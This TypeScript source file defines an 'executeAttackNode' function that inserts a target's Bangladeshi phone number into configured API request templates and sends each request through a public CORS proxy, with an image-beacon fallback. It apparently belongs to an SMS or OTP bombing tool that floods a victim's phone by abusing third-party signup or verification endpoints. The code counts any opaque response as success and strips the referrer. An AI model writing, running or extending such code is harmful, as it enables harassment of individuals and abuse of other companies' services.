import { ApiNode } from '../types';

const CORS_PROXY = "https://corsproxy.io/?";

export const executeAttackNode = async (node: ApiNode, phone: string, signal: AbortSignal): Promise<{ ok: boolean, status: number, error?: string }> => {
    const raw = phone.replace(/^(\+88|88)/, ''); 
    const p88 = `88${raw}`; 
    const pp88 = `+88${raw}`; 

    let body = node.body
      .replace(/{phone}/g, raw)
      .replace(/{phone_88}/g, p88)
      .replace(/{phone_p88}/g, pp88);
    
    let url = node.url
      .replace(/{phone}/g, raw)
      .replace(/{phone_88}/g, p88)
      .replace(/{phone_p88}/g, pp88);

    let headers = {};
    try { headers = JSON.parse(node.headers); } catch (e) { }

    const isGet = node.method === 'GET';
    // Mixed content check (only relevant for browser/local mode, but safe to keep)
    const isMixedContent = typeof window !== 'undefined' && 
                           window.location.protocol === 'https:' && 
                           url.trim().startsWith('http:');

    if (isGet && isMixedContent) {
        return new Promise((resolve) => {
            const img = new Image();
            const beaconUrl = url + (url.includes('?') ? '&' : '?') + `_t=${Date.now()}`;
            const finish = () => {
                resolve({ status: 200, ok: true });
            };
            img.onload = finish; img.onerror = finish; img.src = beaconUrl;
            setTimeout(finish, 3000);
        });
    }

    try {
        // Use proxy for POST/PUT requests to ensure they pass CORS checks in the browser
        // For GET, if it's not mixed content, we also try proxy to avoid CORS blocks
        const useProxy = true; 
        const finalUrl = useProxy ? `${CORS_PROXY}${encodeURIComponent(url)}` : url;

        const response = await fetch(finalUrl, {
            method: node.method,
            headers: headers,
            body: !isGet ? body : undefined,
            signal,
            // With proxy, we can use standard cors mode
            mode: 'cors',
            cache: 'no-store',
            referrerPolicy: 'no-referrer'
        });
        
        // For no-cors (opaque) responses, we assume success if no network error
        if (response.type === 'opaque' || response.status === 0) {
            return { ok: true, status: 0 };
        }
        
        return { 
            ok: response.ok, 
            status: response.status 
        };
    } catch (e: any) {
        if (e.name === 'AbortError') throw e;
        return { 
            ok: false, 
            status: -1, 
            error: e.message 
        };
    }
};